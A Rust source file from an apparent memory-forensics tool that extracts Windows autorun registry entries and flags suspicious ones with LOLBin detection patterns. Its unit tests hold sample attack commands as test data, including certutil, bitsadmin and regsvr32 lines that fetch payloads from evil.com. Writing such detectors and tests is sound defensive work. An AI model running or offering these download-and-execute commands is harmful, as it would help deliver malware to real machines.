//! Windows autorun registry key extraction (MITRE ATT&CK T1547.001).
//!
//! Extracts entries from the most common persistence locations in the
//! Windows registry:
//!
//! - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
//! - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
//! - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices`
//! - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
//! - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (NTUSER.DAT)
//! - `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` (NTUSER.DAT)
//!
//! Each value entry is classified as suspicious if it matches known
//! living-off-the-land binary (LOLBin) abuse patterns.

use memf_core::object_reader::ObjectReader;
use memf_format::PhysicalMemoryProvider;
use winreg_core::cell_reader::CellReader;
use winreg_core::key::Key;

use crate::hive_reader::MemfHiveReader;

/// Maximum number of autorun entries to extract (safety limit).
const MAX_ENTRIES: usize = 10_000;

// ── Registry key paths to walk ───────────────────────────────────────

/// Run key paths relative to the SOFTWARE hive root (HKLM).
const SOFTWARE_RUN_PATHS: &[&str] = &[
    "Microsoft\\Windows\\CurrentVersion\\Run",
    "Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "Microsoft\\Windows\\CurrentVersion\\RunServices",
    "Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
];

/// Run key paths relative to the NTUSER.DAT hive root (HKCU).
const NTUSER_RUN_PATHS: &[&str] = &[
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
];

// ── Output type ──────────────────────────────────────────────────────

/// A single autorun registry value extracted from memory.
#[derive(Debug, Clone, serde::Serialize)]
pub struct RunKeyEntry {
    /// Which hive this entry was found in (e.g., `"SOFTWARE"`, `"NTUSER.DAT"`).
    pub hive: String,
    /// Full registry key path (e.g., `Microsoft\Windows\CurrentVersion\Run`).
    pub key_path: String,
    /// Value name (the autorun entry identifier).
    pub value_name: String,
    /// Value data (the command or path that runs at startup).
    pub value_data: String,
    /// Whether this entry matches suspicious LOLBin abuse patterns.
    pub is_suspicious: bool,
}

// ── Classification ───────────────────────────────────────────────────

/// Classify a run key value as suspicious.
///
/// Returns `true` if the command string matches known living-off-the-land
/// binary (LOLBin) abuse patterns commonly used by malware for persistence:
///
/// - `powershell` with `-enc` (encoded command obfuscation)
/// - `cmd /c` (command shell execution)
/// - `mshta` (HTML application host abuse)
/// - `regsvr32 /s /n` (squiblydoo / AppLocker bypass)
/// - `certutil -urlcache` (download cradle)
/// - `bitsadmin` (download via BITS)
/// - `wscript` / `cscript` launched from `temp` or `appdata` paths
/// - `rundll32` with an unusual (non-system) DLL
pub fn classify_run_key(value_data: &str) -> bool {
    if value_data.is_empty() {
        return false;
    }

    let lower = value_data.to_ascii_lowercase();

    // PowerShell with encoded command
    if lower.contains("powershell") && lower.contains("-enc") {
        return true;
    }

    // cmd /c execution
    if lower.contains("cmd") && lower.contains("/c") {
        return true;
    }

    // mshta abuse
    if lower.contains("mshta") {
        return true;
    }

    // regsvr32 /s /n (squiblydoo technique)
    if lower.contains("regsvr32") && lower.contains("/s") && lower.contains("/n") {
        return true;
    }

    // certutil download cradle
    if lower.contains("certutil") && lower.contains("-urlcache") {
        return true;
    }

    // bitsadmin abuse
    if lower.contains("bitsadmin") {
        return true;
    }

    // wscript/cscript from temp or appdata directories
    if (lower.contains("wscript") || lower.contains("cscript"))
        && (lower.contains("temp") || lower.contains("appdata"))
    {
        return true;
    }

    // rundll32 with unusual DLL (not system32 path)
    if lower.contains("rundll32") && !lower.contains("system32") {
        return true;
    }

    false
}

// ── Walker ───────────────────────────────────────────────────────────

/// Extract autorun entries from SOFTWARE and NTUSER.DAT registry hives in memory.
///
/// `software_hive_addr` is the `_HHIVE` virtual address for the SOFTWARE hive.
/// `ntuser_hive_addr` is the `_HHIVE` virtual address for an NTUSER.DAT hive.
/// Either address may be `0` to skip that hive.
///
/// Returns all value entries found under the standard Run/RunOnce/RunServices
/// key paths, each classified for suspiciousness.
pub fn walk_run_keys<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    software_hive_addr: u64,
    ntuser_hive_addr: u64,
) -> crate::Result<Vec<RunKeyEntry>> {
    let mut entries = Vec::new();

    // Walk SOFTWARE hive paths if address is non-zero.
    if software_hive_addr != 0 {
        for &key_path in SOFTWARE_RUN_PATHS {
            if entries.len() >= MAX_ENTRIES {
                break;
            }
            let cell = match find_run_key_cell(reader, software_hive_addr, key_path) {
                Some(c) => c,
                None => continue,
            };
            let values = match crate::registry_keys::read_registry_values(
                reader,
                software_hive_addr,
                cell,
            ) {
                Ok(v) => v,
                Err(_) => continue,
            };
            for val in values {
                if entries.len() >= MAX_ENTRIES {
                    break;
                }
                let is_suspicious = classify_run_key(&val.data_preview);
                entries.push(RunKeyEntry {
                    hive: "SOFTWARE".to_string(),
                    key_path: key_path.to_string(),
                    value_name: val.name,
                    value_data: val.data_preview,
                    is_suspicious,
                });
            }
        }
    }

    // Walk NTUSER.DAT hive paths if address is non-zero.
    if ntuser_hive_addr != 0 {
        for &key_path in NTUSER_RUN_PATHS {
            if entries.len() >= MAX_ENTRIES {
                break;
            }
            let cell = match find_run_key_cell(reader, ntuser_hive_addr, key_path) {
                Some(c) => c,
                None => continue,
            };
            let values =
                match crate::registry_keys::read_registry_values(reader, ntuser_hive_addr, cell) {
                    Ok(v) => v,
                    Err(_) => continue,
                };
            for val in values {
                if entries.len() >= MAX_ENTRIES {
                    break;
                }
                let is_suspicious = classify_run_key(&val.data_preview);
                entries.push(RunKeyEntry {
                    hive: "NTUSER.DAT".to_string(),
                    key_path: key_path.to_string(),
                    value_name: val.name,
                    value_data: val.data_preview,
                    is_suspicious,
                });
            }
        }
    }

    Ok(entries)
}

// ── Internal hive navigation helper ──────────────────────────────────

/// Navigate a backslash-separated key path relative to the hive root, returning
/// the target key's **cell index** (offset), or `None` if any component is
/// absent or the hive root cannot be bootstrapped.
///
/// Navigation runs through winreg-core's shared `Key` decoder over
/// [`MemfHiveReader`], so every subkey-list form — `lf`/`lh`/`li` **and `ri`
/// (index-root)** — is handled. The returned cell offset feeds the existing
/// [`crate::registry_keys::read_registry_values`] (which expects a cell index),
/// keeping the typed `value_data` preview byte-for-byte identical.
fn find_run_key_cell<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    hive_addr: u64,
    path: &str,
) -> Option<u32> {
    let hive = MemfHiveReader::new(reader, hive_addr);
    let root = hive.root_key().ok()?;
    let key = root.subkey_path(path).ok().flatten()?;
    Some(key_cell_offset(&key))
}

/// The hive-bins-relative cell offset (== memf cell index) of a winreg-core
/// [`Key`], for handoff to cell-index-based readers.
fn key_cell_offset<R: CellReader>(key: &Key<'_, R>) -> u32 {
    key.offset().0
}

#[cfg(test)]
mod tests {
    #![allow(clippy::items_after_statements)]
    use super::*;
    use crate::test_hive::CellHive;

    /// SOFTWARE-style hive reached via HMAP cell translation (root nk at the
    /// regf default 0x20), carrying `Microsoft\Windows\CurrentVersion\Run` with
    /// one Run value, built with the shared `CellHive` harness (real on-disk
    /// nk/lf/vk signatures winreg-core validates). Proves the migrated walker
    /// resolves the value through the HMAP-scattered cell map.
    #[test]
    fn walk_run_keys_software_run_via_cell_map() {
        let utf16 = |s: &str| -> Vec<u8> {
            s.encode_utf16()
                .flat_map(u16::to_le_bytes)
                .chain([0u8, 0u8])
                .collect()
        };
        let mut h = CellHive::new(0x0050_0000);
        // root → Microsoft → Windows → CurrentVersion → Run
        h.nk(0x020, b"Root", 1, 0x0A0, 0);
        h.lf(0x0A0, &[0x0E0]);
        h.nk(0x0E0, b"Microsoft", 1, 0x140, 0);
        h.lf(0x140, &[0x180]);
        h.nk(0x180, b"Windows", 1, 0x1E0, 0);
        h.lf(0x1E0, &[0x220]);
        h.nk(0x220, b"CurrentVersion", 1, 0x2A0, 0);
        h.lf(0x2A0, &[0x300]);
        // Run: no subkeys, one REG_SZ value "Updater" = "X".
        h.nk(0x300, b"Run", 0, 0, 0);
        h.values(0x300, 1, 0x380);
        h.value_list(0x380, &[0x3C0]);
        let data = utf16("X");
        h.vk(0x3C0, b"Updater", 1, data.len() as u32, 0x440);
        h.data(0x440, &data);

        let reader = h.reader();
        let entries = walk_run_keys(&reader, h.hhive_va, 0).unwrap();
        let entry = entries
            .iter()
            .find(|e| e.value_name == "Updater")
            .expect("Run value found via HMAP");
        assert_eq!(entry.hive, "SOFTWARE");
        assert_eq!(entry.key_path, "Microsoft\\Windows\\CurrentVersion\\Run");
        assert_eq!(entry.value_data, "X");
    }

    // ── classify_run_key tests ───────────────────────────────────────

    /// Benign: normal program path is not suspicious.
    #[test]
    fn classify_benign_program_path() {
        assert!(
            !classify_run_key(r"C:\Program Files\Acme\acme.exe"),
            "normal program path should not be suspicious"
        );
    }

    /// Benign: empty string is not suspicious.
    #[test]
    fn classify_empty_not_suspicious() {
        assert!(
            !classify_run_key(""),
            "empty value should not be suspicious"
        );
    }

    /// Suspicious: PowerShell with encoded command.
    #[test]
    fn classify_powershell_encoded() {
        assert!(
            classify_run_key("powershell.exe -enc ZQBjAGgAbwAgAEgAZQBsAGwAbwA="),
            "powershell -enc should be suspicious"
        );
    }

    /// Suspicious: cmd /c execution.
    #[test]
    fn classify_cmd_c() {
        assert!(
            classify_run_key(r"cmd.exe /c start C:\evil.exe"),
            "cmd /c should be suspicious"
        );
    }

    /// Suspicious: mshta abuse.
    #[test]
    fn classify_mshta() {
        assert!(
            classify_run_key("mshta vbscript:Execute(\"CreateObject(...)\")"),
            "mshta should be suspicious"
        );
    }

    /// Suspicious: regsvr32 /s /n (squiblydoo).
    #[test]
    fn classify_regsvr32_squiblydoo() {
        assert!(
            classify_run_key("regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll"),
            "regsvr32 /s /n should be suspicious"
        );
    }

    /// Suspicious: certutil download cradle.
    #[test]
    fn classify_certutil_urlcache() {
        assert!(
            classify_run_key(
                "certutil -urlcache -split -f http://evil.com/payload.exe C:\\payload.exe"
            ),
            "certutil -urlcache should be suspicious"
        );
    }

    /// Suspicious: bitsadmin abuse.
    #[test]
    fn classify_bitsadmin() {
        assert!(
            classify_run_key(
                "bitsadmin /transfer myJob http://evil.com/payload.exe C:\\payload.exe"
            ),
            "bitsadmin should be suspicious"
        );
    }

    /// Suspicious: wscript from temp directory.
    #[test]
    fn classify_wscript_temp() {
        assert!(
            classify_run_key(r"wscript.exe C:\Users\victim\AppData\Local\Temp\evil.vbs"),
            "wscript from temp should be suspicious"
        );
    }

    /// Suspicious: cscript from appdata directory.
    #[test]
    fn classify_cscript_appdata() {
        assert!(
            classify_run_key(r"cscript.exe C:\Users\victim\AppData\Roaming\evil.js"),
            "cscript from appdata should be suspicious"
        );
    }

    /// Suspicious: rundll32 with unusual DLL (not in system32).
    #[test]
    fn classify_rundll32_unusual_dll() {
        assert!(
            classify_run_key(r"rundll32.exe C:\Users\victim\evil.dll,EntryPoint"),
            "rundll32 with non-system32 DLL should be suspicious"
        );
    }

    /// Benign: rundll32 with system32 DLL is not suspicious.
    #[test]
    fn classify_rundll32_system32_benign() {
        assert!(
            !classify_run_key(
                r"C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL"
            ),
            "rundll32 with system32 DLL should not be suspicious"
        );
    }

    /// Benign: wscript from a normal path (not temp/appdata) is not suspicious.
    #[test]
    fn classify_wscript_normal_path_benign() {
        assert!(
            !classify_run_key(r"wscript.exe C:\Scripts\logon.vbs"),
            "wscript from normal path should not be suspicious"
        );
    }

    // ── walk_run_keys tests ──────────────────────────────────────────

    /// Both hive addresses zero → empty Vec (graceful degradation).
    #[test]
    fn walk_run_keys_both_zero_hives() {
        use memf_core::object_reader::ObjectReader;
        use memf_core::test_builders::PageTableBuilder;
        use memf_core::vas::{TranslationMode, VirtualAddressSpace};
        use memf_symbols::isf::IsfResolver;
        use memf_symbols::test_builders::IsfBuilder;

        let isf = IsfBuilder::new()
            .add_struct("_HHIVE", 0x600)
            .add_struct("_CM_KEY_NODE", 0x80)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));

        let result = walk_run_keys(&reader, 0, 0).unwrap();
        assert!(result.is_empty(), "both zero hives should return empty");
    }

    /// RED (registry-dedup migration): a SOFTWARE hive where `CurrentVersion`'s
    /// subkey list is an **`ri` (index-root)** pointing at two `lf` sub-lists,
    /// with `Run` living in the second sub-list. The OLD custom `find_key_cell`
    /// only decodes `lf`/`lh`/`li` and returns `None` on an `ri` signature, so it
    /// cannot reach `Run` → no entry (the `ri`-blind bug on large keys).
    /// winreg-core's `CellReader` recurses `ri` sub-indices, so after the
    /// migration the value is recovered. Asserts the entry IS found — fails
    /// against the `ri`-blind walker. Uses the shared `CellHive` harness (whose
    /// nk/lf/ri/vk builders write real on-disk signatures winreg-core validates).
    #[test]
    fn walk_run_keys_ri_index_root_large_key() {
        use crate::test_hive::CellHive;
        let cmd = "powershell.exe -enc QQBBAEEAQQA=";
        let utf16 = |s: &str| -> Vec<u8> {
            s.encode_utf16()
                .flat_map(u16::to_le_bytes)
                .chain([0u8, 0u8])
                .collect()
        };

        let mut h = CellHive::new(0x0050_0000);
        // root → Microsoft → Windows → CurrentVersion
        h.nk(0x020, b"Root", 1, 0x0A0, 0);
        h.lf(0x0A0, &[0x0E0]);
        h.nk(0x0E0, b"Microsoft", 1, 0x140, 0);
        h.lf(0x140, &[0x180]);
        h.nk(0x180, b"Windows", 1, 0x1E0, 0);
        h.lf(0x1E0, &[0x220]);
        // CurrentVersion's subkey list is an `ri` index-root → two lf sublists.
        // First sublist holds a decoy ("Foo"); second holds "Run". A walker that
        // cannot parse `ri` never reaches either.
        h.nk(0x220, b"CurrentVersion", 2, 0x2A0, 0);
        h.ri(0x2A0, &[0x2E0, 0x320]);
        h.lf(0x2E0, &[0x380]); // sublist 1 → Foo
        h.lf(0x320, &[0x460]); // sublist 2 → Run
        h.nk(0x380, b"Foo", 0, 0, 0);
        // Run key: 0 subkeys, 1 value.
        h.nk(0x460, b"Run", 0, 0, 0);
        h.values(0x460, 1, 0x500);
        h.value_list(0x500, &[0x540]);
        let data = utf16(cmd);
        // REG_SZ (type 1), non-inline → data cell at 0x5C0.
        h.vk(0x540, b"Updater", 1, data.len() as u32, 0x5C0);
        h.data(0x5C0, &data);

        let reader = h.reader();
        let entries = walk_run_keys(&reader, h.hhive_va, 0).unwrap();

        let entry = entries
            .iter()
            .find(|e| e.value_name == "Updater")
            .expect("Run value reached through an ri index-root must be recovered");
        assert_eq!(entry.hive, "SOFTWARE");
        assert_eq!(entry.key_path, "Microsoft\\Windows\\CurrentVersion\\Run");
        assert_eq!(entry.value_data, cmd);
        assert!(
            entry.is_suspicious,
            "powershell -enc autorun must classify suspicious"
        );
    }

    /// SOFTWARE hive address zero, NTUSER non-zero → only NTUSER entries.
    #[test]
    fn walk_run_keys_software_zero_skipped() {
        use memf_core::object_reader::ObjectReader;
        use memf_core::test_builders::PageTableBuilder;
        use memf_core::vas::{TranslationMode, VirtualAddressSpace};
        use memf_symbols::isf::IsfResolver;
        use memf_symbols::test_builders::IsfBuilder;

        let isf = IsfBuilder::new()
            .add_struct("_HHIVE", 0x600)
            .add_struct("_CM_KEY_NODE", 0x80)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));

        // Non-zero NTUSER addr that points nowhere readable → empty but no panic.
        let result = walk_run_keys(&reader, 0, 0xDEAD_0000);
        // Should not panic; either empty Ok or tolerable error.
        assert!(
            result.is_ok(),
            "walker should degrade gracefully with unreachable hive"
        );
    }
}
